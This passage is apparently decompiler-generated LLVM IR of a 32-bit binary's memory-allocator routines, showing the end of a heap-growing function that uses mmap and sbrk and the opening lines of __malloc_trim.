  %v0_80618bb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80618bb

dec_label_pc_80618ac:                             ; preds = %dec_label_pc_80618a3
  store i32 %v1_806176b, i32* @ecx, align 4
  %v2_80618b0 = add i32 %v1_806186c, %v1_806176b
  store i32 %v2_80618b0, i32* %eax.global-to-local, align 4
  %v2_80618b4 = add i32 %v2_8061888, %v2_80618b0
  %v5_80618b7 = and i32 %v2_80618b4, %v1_8061866
  store i32 %v5_80618b7, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80618bb

dec_label_pc_80618bb:                             ; preds = %dec_label_pc_80618a3.dec_label_pc_80618bb_crit_edge, %dec_label_pc_80618ac
  %v3_80618c6 = phi i32 [ %v0_80618bb.pre, %dec_label_pc_80618a3.dec_label_pc_80618bb_crit_edge ], [ %v5_80618b7, %dec_label_pc_80618ac ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp91 = icmp ult i32 %v3_80618c6, 1048576
  %v5_80618c6 = select i1 %tmp91, i32 1048576, i32 %v3_80618c6
  store i32 %v5_80618c6, i32* @esi, align 4
  %tmp142 = icmp ugt i32 %v5_80618c6, %v8_8061391
  br i1 %tmp142, label %dec_label_pc_80618d3, label %dec_label_pc_8061abe

dec_label_pc_80618d3:                             ; preds = %dec_label_pc_80618bb
  %v0_80618d3 = load i32, i32* @edx, align 4
  %v8_80618e0 = call i32 @mmap(i32 0, i32 %v5_80618c6, i32 3, i32 34, i32 0, i32 0, i32 %v0_80618d3, i32 %v0_80618d3)
  store i32 %v8_80618e0, i32* %eax.global-to-local, align 4
  %v10_80618e8 = icmp eq i32 %v8_80618e0, -1
  store i32 %v8_80618e0, i32* @ebx, align 4
  br i1 %v10_80618e8, label %dec_label_pc_80618fb, label %dec_label_pc_80618ef

dec_label_pc_80618ef:                             ; preds = %dec_label_pc_80618d3
  %v0_80618ef = load i8, i8* @global_var_8078c30.1625, align 1
  %v2_80618ef = and i8 %v0_80618ef, -2
  store i8 %v2_80618ef, i8* @global_var_8078c30.1625, align 16
  %v1_80618f6 = load i32, i32* @esi, align 4
  %v2_80618f6 = add i32 %v1_80618f6, %v8_80618e0
  br label %dec_label_pc_80618fe

dec_label_pc_80618fb:                             ; preds = %dec_label_pc_80618d3, %dec_label_pc_8061890
  %v0_80618fe41 = phi i32 [ %v8_80618e0, %dec_label_pc_80618d3 ], [ %v1_8061894, %dec_label_pc_8061890 ]
  br label %dec_label_pc_80618fe

dec_label_pc_80618fe:                             ; preds = %dec_label_pc_80618ef, %dec_label_pc_80618fb
  %v0_80619d0 = phi i32 [ %v8_80618e0, %dec_label_pc_80618ef ], [ %v0_80618fe41, %dec_label_pc_80618fb ]
  %v0_80619c2 = phi i32 [ %v2_80618f6, %dec_label_pc_80618ef ], [ -1, %dec_label_pc_80618fb ]
  store i32 %v0_80619c2, i32* %edx.global-to-local, align 4
  %v10_80618fe = icmp eq i32 %v0_80619d0, -1
  br i1 %v10_80618fe, label %dec_label_pc_8061abe, label %dec_label_pc_8061907

dec_label_pc_8061907:                             ; preds = %dec_label_pc_80618fe
  %v0_806190b = load i32, i32* @global_var_8078c38.1622, align 8
  %v1_806190b = load i32, i32* @esi, align 4
  %v2_806190b = add i32 %v1_806190b, %v0_806190b
  store i32 %v2_806190b, i32* @global_var_8078c38.1622, align 8
  %v2_8061911 = add i32 %v1_806186c, %v0_806184d
  store i32 %v2_8061911, i32* %ecx.global-to-local, align 4
  %v2_8061913 = sub i32 %v0_80619d0, %v2_8061911
  %v7_8061913 = icmp ult i32 %v0_80619d0, %v2_8061911
  %v12_8061913 = icmp eq i32 %v2_8061913, 0
  %v1_8061915 = icmp eq i1 %v12_8061913, false
  br i1 %v1_8061915, label %dec_label_pc_806192e, label %dec_label_pc_8061917

dec_label_pc_8061917:                             ; preds = %dec_label_pc_8061907
  %v10_8061917 = icmp eq i32 %v0_80619c2, -1
  %v1_806191a = icmp eq i1 %v10_8061917, false
  br i1 %v1_806191a, label %dec_label_pc_806192e, label %dec_label_pc_806191c

dec_label_pc_806191c:                             ; preds = %dec_label_pc_8061917
  store i32 %v0_806184d, i32* %ebx.global-to-local, align 4
  %v2_8061920 = add i32 %v1_806190b, %v1_806186c
  %v1_8061923 = or i32 %v2_8061920, 1
  store i32 %v1_8061923, i32* %eax.global-to-local, align 4
  store i32 %v1_8061923, i32* %v2_806185c, align 4
  br label %dec_label_pc_8061a58

dec_label_pc_806192e:                             ; preds = %dec_label_pc_8061917, %dec_label_pc_8061907
  %v0_806192e = load i8, i8* @global_var_8078c30.1625, align 1
  %v1_806192e = sext i8 %v0_806192e to i32
  store i32 %v1_806192e, i32* %eax.global-to-local, align 4
  %v2_8061933 = urem i8 %v0_806192e, 2
  %v3_8061933 = icmp eq i8 %v2_8061933, 0
  br i1 %v3_8061933, label %dec_label_pc_8061947, label %dec_label_pc_8061937

dec_label_pc_8061937:                             ; preds = %dec_label_pc_806192e
  br i1 %v2_806186c, label %dec_label_pc_8061947, label %dec_label_pc_806193b

dec_label_pc_806193b:                             ; preds = %dec_label_pc_8061937
  %v1_806193d = icmp eq i1 %v7_8061913, false
  br i1 %v1_806193d, label %dec_label_pc_8061947, label %dec_label_pc_806193f

dec_label_pc_806193f:                             ; preds = %dec_label_pc_806193b
  %v1_806193f = and i32 %v1_806192e, -2
  %v4_806193f = trunc i32 %v1_806193f to i8
  store i32 %v1_806193f, i32* %eax.global-to-local, align 4
  store i8 %v4_806193f, i8* @global_var_8078c30.1625, align 16
  br label %dec_label_pc_8061947

dec_label_pc_8061947:                             ; preds = %dec_label_pc_806193b, %dec_label_pc_8061937, %dec_label_pc_806192e, %dec_label_pc_806193f
  %v0_8061947 = phi i8 [ %v0_806192e, %dec_label_pc_806193b ], [ %v0_806192e, %dec_label_pc_8061937 ], [ %v0_806192e, %dec_label_pc_806192e ], [ %v4_806193f, %dec_label_pc_806193f ]
  %v1_8061947 = urem i8 %v0_8061947, 2
  %v2_8061947 = icmp eq i8 %v1_8061947, 0
  br i1 %v2_8061947, label %dec_label_pc_80619c2, label %dec_label_pc_8061950

dec_label_pc_8061950:                             ; preds = %dec_label_pc_8061947
  br i1 %v2_806186c, label %dec_label_pc_806195e, label %dec_label_pc_8061954

dec_label_pc_8061954:                             ; preds = %dec_label_pc_8061950
  store i32 %v2_8061913, i32* %eax.global-to-local, align 4
  %v2_8061958 = add i32 %v2_806190b, %v2_8061913
  store i32 %v2_8061958, i32* @global_var_8078c38.1622, align 8
  br label %dec_label_pc_806195e

dec_label_pc_806195e:                             ; preds = %dec_label_pc_8061950, %dec_label_pc_8061954
  %v1_8061960 = urem i32 %v0_80619d0, 8
  %v2_8061960 = icmp eq i32 %v1_8061960, 0
  store i32 %v1_8061960, i32* %edx.global-to-local, align 4
  %v1_8061963 = icmp eq i1 %v2_8061960, false
  br i1 %v1_8061963, label %dec_label_pc_806196b, label %dec_label_pc_8061965

dec_label_pc_8061965:                             ; preds = %dec_label_pc_806195e
  store i32 %v0_80619d0, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061975

dec_label_pc_806196b:                             ; preds = %dec_label_pc_806195e
  %v2_8061970 = sub nsw i32 8, %v1_8061960
  store i32 %v2_8061970, i32* %eax.global-to-local, align 4
  %v2_8061972 = add i32 %v2_8061970, %v0_80619d0
  store i32 %v2_8061972, i32* @edi, align 4
  br label %dec_label_pc_8061975

dec_label_pc_8061975:                             ; preds = %dec_label_pc_8061965, %dec_label_pc_806196b
  %v0_8061978 = phi i32 [ 0, %dec_label_pc_8061965 ], [ %v2_8061970, %dec_label_pc_806196b ]
  %v2_8061975 = add i32 %v1_806190b, %v0_80619d0
  %v2_806197f = sub i32 0, %v2_8061975
  store i32 %v2_806197f, i32* %edx.global-to-local, align 4
  %v2_8061978 = add i32 %v1_806186c, %v1_806176b
  %v2_806197d = add i32 %v2_8061978, %v2_8061975
  %v5_8061981 = add i32 %v2_806197d, %v0_8061978
  %v5_8061989 = and i32 %v5_8061981, %v1_8061866
  store i32 %v5_8061989, i32* %eax.global-to-local, align 4
  %v2_8061990 = sub i32 %v5_8061989, %v2_8061975
  store i32 %v2_8061990, i32* @esi, align 4
  %v1_8061994 = call i32 @__GI_sbrk(i32 %v2_8061990)
  store i32 %v1_8061994, i32* %eax.global-to-local, align 4
  %v10_806199c = icmp eq i32 %v1_8061994, -1
  %v1_806199f = icmp eq i1 %v10_806199c, false
  br i1 %v1_806199f, label %dec_label_pc_80619af, label %dec_label_pc_80619a1

dec_label_pc_80619a1:                             ; preds = %dec_label_pc_8061975
  %v1_80619a6 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80619a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80619a6, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80619e5

dec_label_pc_80619af:                             ; preds = %dec_label_pc_8061975
  %v1_80619af = load i32, i32* @ebx, align 4
  %v7_80619af = icmp ult i32 %v1_8061994, %v1_80619af
  store i32 %v1_8061994, i32* %edx.global-to-local, align 4
  %v1_80619b3 = icmp eq i1 %v7_80619af, false
  br i1 %v1_80619b3, label %dec_label_pc_80619ea, label %dec_label_pc_80619b5

dec_label_pc_80619b5:                             ; preds = %dec_label_pc_80619af
  %v0_80619b5 = load i8, i8* @global_var_8078c30.1625, align 1
  %v2_80619b5 = and i8 %v0_80619b5, -2
  store i8 %v2_80619b5, i8* @global_var_8078c30.1625, align 16
  store i32 %v2_8061975, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80619c9

dec_label_pc_80619c2:                             ; preds = %dec_label_pc_8061947
  %v10_80619c2 = icmp eq i32 %v0_80619c2, -1
  br i1 %v10_80619c2, label %dec_label_pc_80619cd, label %dec_label_pc_80619c7

dec_label_pc_80619c7:                             ; preds = %dec_label_pc_80619c2
  store i32 %v0_80619d0, i32* @edi, align 4
  br label %dec_label_pc_80619c9

dec_label_pc_80619c9:                             ; preds = %dec_label_pc_80619b5, %dec_label_pc_80619c7
  %v0_80619ea48 = phi i32 [ %v2_8061975, %dec_label_pc_80619b5 ], [ %v0_80619c2, %dec_label_pc_80619c7 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80619ea

dec_label_pc_80619cd:                             ; preds = %dec_label_pc_80619c2
  store i32 %v0_80619d0, i32* @edi, align 4
  %v1_80619d4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80619d4, i32* %edx.global-to-local, align 4
  %v1_80619db = load i32, i32* @ebx, align 4
  %v2_80619db = sub i32 %v1_80619d4, %v1_80619db
  %v1_80619dd = load i32, i32* @esi, align 4
  %v2_80619dd = sub i32 %v2_80619db, %v1_80619dd
  store i32 %v2_80619dd, i32* %eax.global-to-local, align 4
  %v0_80619df = load i32, i32* @global_var_8078c38.1622, align 8
  %v2_80619df = add i32 %v0_80619df, %v2_80619dd
  store i32 %v2_80619df, i32* @global_var_8078c38.1622, align 8
  br label %dec_label_pc_80619e5

dec_label_pc_80619e5:                             ; preds = %dec_label_pc_80619a1, %dec_label_pc_80619cd
  %v0_80619ea47 = phi i32 [ %v1_80619a6, %dec_label_pc_80619a1 ], [ %v1_80619d4, %dec_label_pc_80619cd ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80619ea

dec_label_pc_80619ea:                             ; preds = %dec_label_pc_80619af, %dec_label_pc_80619c9, %dec_label_pc_80619e5
  %v0_80619ef = phi i32 [ %v1_8061994, %dec_label_pc_80619af ], [ %v0_80619ea48, %dec_label_pc_80619c9 ], [ %v0_80619ea47, %dec_label_pc_80619e5 ]
  %v10_80619ea = icmp eq i32 %v0_80619ef, -1
  br i1 %v10_80619ea, label %dec_label_pc_8061a58, label %dec_label_pc_80619ef

dec_label_pc_80619ef:                             ; preds = %dec_label_pc_80619ea
  %v1_80619ef = load i32, i32* @esi, align 4
  %v2_80619ef = add i32 %v1_80619ef, %v0_80619ef
  %v1_80619f2 = load i32, i32* @edi, align 4
  %v2_80619f2 = sub i32 %v2_80619ef, %v1_80619f2
  %v1_80619f4 = or i32 %v2_80619f2, 1
  store i32 %v1_80619f4, i32* %eax.global-to-local, align 4
  %v2_80619f7 = add i32 %v1_80619f2, 4
  %v3_80619f7 = inttoptr i32 %v2_80619f7 to i32*
  store i32 %v1_80619f4, i32* %v3_80619f7, align 4
  %v0_80619fa = load i32, i32* @global_var_8078c38.1622, align 8
  %v1_80619fa = load i32, i32* @esi, align 4
  %v2_80619fa = add i32 %v1_80619fa, %v0_80619fa
  store i32 %v2_80619fa, i32* @global_var_8078c38.1622, align 8
  %v0_8061a02 = load i32, i32* @edi, align 4
  store i32 %v0_8061a02, i32* @global_var_80788fc.1609, align 4
  br i1 %v2_806186c, label %dec_label_pc_8061a58, label %dec_label_pc_8061a0a

dec_label_pc_8061a0a:                             ; preds = %dec_label_pc_80619ef
  store i32 %v0_806184d, i32* %ecx.global-to-local, align 4
  %v1_8061a0e = add i32 %v1_806186c, -12
  %v1_8061a11 = and i32 %v1_8061a0e, -8
  store i32 %v1_8061a11, i32* %eax.global-to-local, align 4
  %v1_8061a16 = or i32 %v1_8061a11, 1
  store i32 %v1_8061a16, i32* %edx.global-to-local, align 4
  %v5_8061a19 = icmp ult i32 %v1_8061a11, 15
  store i32 %v1_8061a16, i32* %v2_806185c, align 4
  %v0_8061a1f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061a1f = load i32, i32* %eax.global-to-local, align 4
  %v2_8061a1f = add i32 %v0_8061a1f, 4
  %v3_8061a1f = add i32 %v2_8061a1f, %v1_8061a1f
  %v4_8061a1f = inttoptr i32 %v3_8061a1f to i32*
  store i32 5, i32* %v4_8061a1f, align 4
  %v0_8061a27 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061a27 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8061a27 = add i32 %v0_8061a27, 8
  %v3_8061a27 = add i32 %v2_8061a27, %v1_8061a27
  %v4_8061a27 = inttoptr i32 %v3_8061a27 to i32*
  store i32 5, i32* %v4_8061a27, align 4
  br i1 %v5_8061a19, label %dec_label_pc_8061a58, label %dec_label_pc_8061a31

dec_label_pc_8061a31:                             ; preds = %dec_label_pc_8061a0a
  %v0_8061a31 = load i32, i32* @global_var_8078c14.1626, align 4
  store i32 %v0_8061a31, i32* @ebx, align 4
  %v0_8061a37 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061a3c = add i32 %v0_8061a37, 8
  store i32 %v1_8061a3c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @global_var_8078c14.1626, align 4
  %v1_8061a4a = call i32 @free(i32 %v1_8061a3c)
  store i32 %v1_8061a4a, i32* %eax.global-to-local, align 4
  %v0_8061a52 = load i32, i32* @ebx, align 4
  store i32 %v0_8061a52, i32* @global_var_8078c14.1626, align 4
  br label %dec_label_pc_8061a58

dec_label_pc_8061a58:                             ; preds = %dec_label_pc_8061a0a, %dec_label_pc_80619ef, %dec_label_pc_80619ea, %dec_label_pc_806191c, %dec_label_pc_8061a31
  %v0_8061a58 = load i32, i32* @global_var_8078c38.1622, align 8
  %v0_8061a5d = load i32, i32* @global_var_8078c3c.1627, align 4
  %v0_8061a69 = load i32, i32* @global_var_80788fc.1609, align 4
  store i32 %v0_8061a69, i32* %ebx.global-to-local, align 4
  %tmp92 = icmp ule i32 %v0_8061a58, %v0_8061a5d
  %v5_8061a6f = select i1 %tmp92, i32 %v0_8061a5d, i32 %v0_8061a58
  store i32 %v5_8061a6f, i32* %edx.global-to-local, align 4
  %v1_8061a72 = load i32, i32* @global_var_8078c34.1621, align 4
  %v2_8061a72 = add i32 %v1_8061a72, %v0_8061a58
  store i32 %v5_8061a6f, i32* @global_var_8078c3c.1627, align 4
  %v1_8061a7e = load i32, i32* @global_var_8078c44.1623, align 4
  %tmp93 = icmp ule i32 %v2_8061a72, %v1_8061a7e
  %v5_8061a84 = select i1 %tmp93, i32 %v1_8061a7e, i32 %v2_8061a72
  store i32 %v5_8061a84, i32* %eax.global-to-local, align 4
  store i32 %v5_8061a84, i32* @global_var_8078c44.1623, align 4
  %v1_8061a90 = add i32 %v0_8061a69, 4
  %v2_8061a90 = inttoptr i32 %v1_8061a90 to i32*
  %v3_8061a90 = load i32, i32* %v2_8061a90, align 4
  %v1_8061a93 = and i32 %v3_8061a90, -4
  store i32 %v1_8061a93, i32* @ecx, align 4
  %v10_8061a96 = icmp ult i32 %v1_8061a93, %v1_8061702
  br i1 %v10_8061a96, label %dec_label_pc_8061abe, label %dec_label_pc_8061a9c

dec_label_pc_8061a9c:                             ; preds = %dec_label_pc_8061a58
  %v5_8061aa0 = sub i32 %v1_8061a93, %v8_8061391
  store i32 %v5_8061aa0, i32* %ecx.global-to-local, align 4
  %v2_8061aa4 = add i32 %v0_8061a69, %v8_8061391
  store i32 %v2_8061aa4, i32* %edx.global-to-local, align 4
  %v1_8061aa7 = or i32 %v8_8061391, 1
  store i32 %v1_8061aa7, i32* %v2_8061a90, align 4
  %v0_8061aad = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061aad = or i32 %v0_8061aad, 1
  store i32 %v1_8061aad, i32* @ecx, align 4
  %v0_8061ab0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061ab0 = add i32 %v0_8061ab0, 8
  store i32 %v1_8061ab0, i32* %eax.global-to-local, align 4
  %v0_8061ab3 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8061ab3, i32* @global_var_80788fc.1609, align 4
  %v2_8061ab9 = add i32 %v0_8061ab3, 4
  %v3_8061ab9 = inttoptr i32 %v2_8061ab9 to i32*
  store i32 %v1_8061aad, i32* %v3_8061ab9, align 4
  %v0_8061acc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061acc

dec_label_pc_8061abe:                             ; preds = %dec_label_pc_80618bb, %dec_label_pc_8061a58, %dec_label_pc_80618fe
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061acc

dec_label_pc_8061acc:                             ; preds = %dec_label_pc_8061a9c, %dec_label_pc_80617e8, %dec_label_pc_8061744, %dec_label_pc_8061abe
  %v0_8061acc = phi i32 [ %v0_8061acc.pre, %dec_label_pc_8061a9c ], [ %v1_8061845, %dec_label_pc_80617e8 ], [ %v1_806175a, %dec_label_pc_8061744 ], [ 0, %dec_label_pc_8061abe ]
  store i32 %v0_8061acc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061ace

dec_label_pc_8061ace:                             ; preds = %dec_label_pc_8061710, %dec_label_pc_80616ed, %dec_label_pc_8061603, %dec_label_pc_80614d0, %dec_label_pc_8061419, %dec_label_pc_8061acc
  store i32 %v2_8061347, i32* %eax.global-to-local, align 4
  %v3_8061ad7 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8061ad7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061adf

dec_label_pc_8061adf:                             ; preds = %dec_label_pc_8061365, %dec_label_pc_8061ace
  %v0_8061ae2 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8061ae2, i32* %eax.global-to-local, align 4
  %v2_8061ae4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8061ae4, i32* @ebx, align 4
  store i32 %v0_8061334, i32* @esi, align 4
  store i32 %v0_8061333, i32* @edi, align 4
  store i32 %v0_8061332, i32* @ebp, align 4
  ret i32 %v0_8061ae2

; uselistorder directives
  uselistorder i32 %v1_8061a7e, { 1, 0 }
  uselistorder i32 %v2_8061a72, { 1, 0 }
  uselistorder i32 %v0_8061a5d, { 1, 0 }
  uselistorder i32 %v0_8061a58, { 0, 2, 1 }
  uselistorder i32 %v1_80619f2, { 1, 0 }
  uselistorder i32 %v0_80619ef, { 1, 0 }
  uselistorder i32 %v2_80619dd, { 1, 0 }
  uselistorder i32 %v1_8061994, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8061990, { 1, 0 }
  uselistorder i32 %v2_8061975, { 3, 4, 1, 0, 2 }
  uselistorder i32 %v2_8061970, { 1, 0, 2 }
  uselistorder i32 %v1_8061960, { 2, 1, 0 }
  uselistorder i8 %v0_806192e, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8061911, { 1, 0, 2 }
  uselistorder i32 %v0_80619c2, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80619d0, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v8_80618e0, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %v5_80618c6, { 1, 0, 2 }
  uselistorder i32 %v3_80618c6, { 1, 0 }
  uselistorder i32 %v1_8061894, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8061888, { 0, 2, 1, 3 }
  uselistorder i8 %v0_8061873, { 1, 0 }
  uselistorder i32 %v1_806186c, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_806184d, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_8061833, { 1, 0 }
  uselistorder i32 %v2_8061827, { 1, 0 }
  uselistorder i32 %v2_8061813, { 0, 3, 1, 2 }
  uselistorder i32 %v2_80617fa, { 1, 2, 0 }
  uselistorder i32 %v1_80617fa, { 1, 0, 2 }
  uselistorder i32 %v1_80617f9, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_80617f3, { 1, 0 }
  uselistorder i32 %v2_80617cf, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80617c5, { 2, 1, 0 }
  uselistorder i32 %v8_80617b0, { 5, 4, 2, 1, 3, 0, 6 }
  uselistorder i32 %v2_8061797, { 1, 0, 2 }
  uselistorder i32 %v1_806176b, { 0, 1, 7, 2, 6, 5, 3, 4, 8 }
  uselistorder i32 %v0_806173c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8061702, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80616f5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80616cd, { 1, 0 }
  uselistorder i32 %v1_8061675, { 1, 0 }
  uselistorder i32 %v3_806166a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8061664, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_806166113, { 1, 0 }
  uselistorder i32 %v2_8061656, { 1, 0 }
  uselistorder i32 %v1_806163a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8061636, { 2, 1, 0 }
  uselistorder i32 %v1_8061632, { 1, 0 }
  uselistorder i32 %v1_806162d, { 2, 1, 0 }
  uselistorder i32 %v2_806161c, { 1, 0 }
  uselistorder i32 %v1_8061619, { 1, 2, 0, 3 }
  uselistorder i32 %v4_80615b2, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8061600, { 1, 0 }
  uselistorder i32 %v0_80615c8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_806159e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_806156b112, { 0, 2, 1 }
  uselistorder i32 %v1_8061564, { 1, 0 }
  uselistorder i32 %stack_var_-56.0, { 2, 1, 0 }
  uselistorder i32 %v0_806156b, { 0, 2, 1 }
  uselistorder i32 %v2_8061544, { 1, 0 }
  uselistorder i32 %v1_8061538, { 2, 1, 0 }
  uselistorder i32 %v3_8061527, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8061522, { 1, 0, 2 }
  uselistorder i32 %v3_8061505, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80614fc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80614e2, { 1, 0 }
  uselistorder i32 %v0_80614d8, { 1, 0, 2 }
  uselistorder i32 %v0_80614b1, { 1, 0 }
  uselistorder i32 %v1_8061452, { 0, 2, 1, 3 }
  uselistorder i32 %v3_806144f, { 2, 1, 0, 3 }
  uselistorder i32 %v0_806156b120, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80613f8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80613ee, { 2, 1, 0 }
  uselistorder i32 %v2_80613c6, { 1, 0 }
  uselistorder i32 %v8_8061391, { 14, 5, 29, 2, 1, 6, 27, 28, 30, 15, 7, 31, 25, 26, 24, 8, 23, 34, 9, 33, 32, 20, 11, 21, 0, 13, 10, 22, 12, 35, 3, 19, 17, 18, 4, 16, 36 }
  uselistorder i8 %v0_806137b, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v0_8061360, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 47, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 48, 50, 51 }
  uselistorder i32* %ebx.global-to-local, { 24, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 0, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 54, 50, 51, 53, 52, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i8* @global_var_8078c30.1625, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134711556, { 2, 0, 3, 1 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80788fc.1609 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8061adf, { 1, 0 }
  uselistorder label %dec_label_pc_8061ace, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8061acc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8061abe, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8061a58, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80619ea, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80619e5, { 1, 0 }
  uselistorder label %dec_label_pc_80619c9, { 1, 0 }
  uselistorder label %dec_label_pc_8061975, { 1, 0 }
  uselistorder label %dec_label_pc_806195e, { 1, 0 }
  uselistorder label %dec_label_pc_8061947, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80618fe, { 1, 0 }
  uselistorder label %dec_label_pc_80618bb, { 1, 0 }
  uselistorder label %dec_label_pc_806184d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80617e8, { 1, 0 }
  uselistorder label %dec_label_pc_80616f5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80616ed, { 1, 0 }
  uselistorder label %dec_label_pc_8061661, { 1, 0 }
  uselistorder label %dec_label_pc_8061666.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_806163a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8061603, { 1, 0 }
  uselistorder label %dec_label_pc_80615bc, { 1, 0 }
  uselistorder label %dec_label_pc_806157d, { 1, 0 }
  uselistorder label %dec_label_pc_8061560, { 2, 0, 1 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %dec_label_pc_8061536, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8061527, { 1, 0 }
  uselistorder label %dec_label_pc_80614d0, { 1, 0 }
  uselistorder label %dec_label_pc_8061419, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8061aed = load i32, i32* @edx, align 4
  store i32 %v0_8061aed, i32* %ebp.global-to-local, align 4
  %v0_8061af0 = load i32, i32* @esi, align 4
  %v1_8061af5 = add i32 %v0_8061aed, 860
  %v2_8061af5 = inttoptr i32 %v1_8061af5 to i32*
  %v3_8061af5 = load i32, i32* %v2_8061af5, align 4
  store i32 %v3_8061af5, i32* @ecx, align 4
  %v1_8061afb = add i32 %v0_8061aed, 44
  %v2_8061afb = inttoptr i32 %v1_8061afb to i32*
  %v3_8061afb = load i32, i32* %v2_8061afb, align 4
  %v1_8061afe = add i32 %v3_8061afb, 4
  %v2_8061afe = inttoptr i32 %v1_8061afe to i32*
  %v3_8061afe = load i32, i32* %v2_8061afe, align 4
  %v1_8061b03 = and i32 %v3_8061afe, -4
  store i32 %v1_8061b03, i32* @esi, align 4
  %v1_8061b0a = load i32, i32* @eax, align 4
  %v2_8061b06 = add i32 %v3_8061af5, -17
  %v3_8061b06 = add i32 %v2_8061b06, %v1_8061b03
  %v2_8061b0a = sub i32 %v3_8061b06, %v1_8061b0a
  %div = udiv i32 %v2_8061b0a, %v3_8061af5
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_8061b12 = add i32 %div, -1
  %v4_8061b13 = mul i32 %v1_8061b12, %v3_8061af5
  store i32 %v4_8061b13, i32* @ebx, align 4
  %tmp9 = icmp slt i32 %v4_8061b13, 1
